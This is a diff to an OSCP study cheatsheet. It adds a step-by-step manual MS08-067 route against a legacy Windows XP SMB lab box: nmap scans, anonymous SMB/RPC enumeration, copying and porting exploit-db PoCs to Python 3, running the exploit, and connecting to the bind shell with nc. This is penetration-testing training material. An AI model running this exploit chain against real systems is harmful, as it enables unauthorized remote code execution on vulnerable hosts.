@@ -1,11 +1,11 @@
 ---
 tags: [OSCP, Cheatsheet, Commands, Exam]
 status: Maintained
-last_audited: 2026-09-13
+last_audited: 2026-09-14
 ---
 
 <!-- Living document: update after every box, module, or runbook change. -->
-<!-- Last full vault audit: 2026-09-13. Sources: all maintained command appendices, RUNBOOK V2, exam runbooks, methodology, modern tooling, modules, and box evidence. -->
+<!-- Last full vault audit: 2026-09-14. Sources: all maintained command appendices, RUNBOOK V2, exam runbooks, methodology, modern tooling, modules, and box evidence, including the Legacy SMB/RPC route. -->
 <!-- Use this as the speed sheet. Open the linked appendix or runbook when the branch needs explanation, caveats, or a longer procedure. -->
 
 # CTRL+F ANYTHING
@@ -1147,6 +1147,119 @@ python3 "$BoxDir/exploits/49125.py" "$BoxIP" "$WebPort" "$HfsCommand"
 > A successful HFS request does not prove a shell. Confirm the file-server access log, receive the callback, and run `whoami` before local enumeration. Keep the HFS port, transfer port, and callback port separate.
 
 See [[OSCP/BOXES/WRITE UPS/Windows/Optimum|Optimum]], [[RUNBOOK V2/Windows - Exploit Search]], and [[COMMAND BREAKDOWNS/Web Applications (Breakdowns)|Web application breakdowns]].
+
+### Legacy: MS08-067 manual SMB/RPC route
+
+Use this branch when the service scan identifies Windows XP or another legacy SMBv1 host and the intended route is MS08-067/CVE-2008-4250. The route below is deliberately manual: review and adapt the Python PoC, validate the target profile, then connect to the target-side bind shell. No Metasploit console or exploit module is required.
+
+1. Scan the complete TCP range and save the service evidence:
+
+~~~bash
+sudo nmap -Pn -n --min-rate 5000 -T4 -p- \
+  -oA $BoxDir/nmap/allports $BoxIP
+~~~
+
+2. Identify SMB, the OS, the NetBIOS name, and the security mode:
+
+~~~bash
+sudo nmap -Pn -n -sC -sV -p 135,139,445 \
+  -oA $BoxDir/nmap/services $BoxIP
+~~~
+
+3. Check anonymous SMB and RPC access before assuming credentials exist:
+
+~~~bash
+smbclient -N -L //$BoxIP
+~~~
+
+~~~bash
+rpcclient -U '' -N $BoxIP \
+  -c 'srvinfo;enumdomusers;netshareenumall'
+~~~
+
+4. Run the version-specific and broad SMB vulnerability checks. Treat inconsistent NSE output as a clue to validate, not as the final verdict:
+
+~~~bash
+sudo nmap -Pn -n --script smb-vuln-ms08-067 -p 445 $BoxIP
+~~~
+
+~~~bash
+sudo nmap -Pn -n --script 'smb-vuln-*' -p 445 $BoxIP
+~~~
+
+5. Search, copy, and inspect the public exploit:
+
+~~~bash
+searchsploit ms08-067
+~~~
+
+~~~bash
+cp /usr/share/exploitdb/exploits/windows/remote/40279.py \
+  $BoxDir/exploits/40279.py
+~~~
+
+~~~bash
+searchsploit -p 7132
+cp /usr/share/exploitdb/exploits/windows/remote/7132.py \
+  $BoxDir/exploits/7132.py
+~~~
+
+6. Confirm the usable runtime and preserve the original before porting:
+
+~~~bash
+python2 --version
+python3 --version
+python2 -c "from impacket import smb, uuid, dcerpc; print 'ok'"
+python3 -c "from impacket import smb, uuid; from impacket.dcerpc.v5 import transport; print('ok')"
+~~~
+
+~~~bash
+cp $BoxDir/exploits/40279.py $BoxDir/exploits/40279-adapted.py
+sed -i 's/except ImportError, _:/except ImportError as _:/g' \
+  $BoxDir/exploits/40279-adapted.py
+sed -i "s/^\(\s*\)print '\(.*\)'/\1print('\2')/g" \
+  $BoxDir/exploits/40279-adapted.py
+~~~
+
+7. Normalise tabs, repair the method indentation and Python 3 byte-string concatenations, then syntax-check:
+
+~~~bash
+python3 - <<'PY'
+import os
+from pathlib import Path
+
+path = Path(os.environ['BoxDir']) / 'exploits' / '40279-adapted.py'
+path.write_text(path.read_text().expandtabs(4))
+print('tabs expanded')
+PY
+~~~
+
+~~~bash
+python3 -c "import ast; ast.parse(open('$BoxDir/exploits/40279-adapted.py').read()); print('syntax ok')"
+~~~
+
+8. Use target profile `6` for Windows XP SP3 English with NX enabled. Keep the exploit's `browser` named pipe, run the PoC, and connect as a client because the final payload is a bind shell:
+
+~~~bash
+python3 $BoxDir/exploits/40279-adapted.py $BoxIP 6
+~~~
+
+~~~bash
+nc $BoxIP $Port
+~~~
+
+9. Verify the old shell with commands available on Windows XP:
+
+~~~cmd
+hostname
+ver
+ipconfig
+echo %username%
+~~~
+
+`whoami` may not exist on XP, and a reverse-shell listener is the wrong direction for a bind payload. Keep flag values private in `$BoxDir/loot/flags.txt`; do not put them in this cheatsheet.
+
+See [[OSCP/BOXES/WRITE UPS/Windows/Legacy|Legacy]], [[RUNBOOK V2/Windows - SMB Enum]], [[RUNBOOK V2/Windows - Exploit Search]], and [[RUNBOOK V2/Windows - Shell Received]].
 
 ```bash
 # Search by product and version
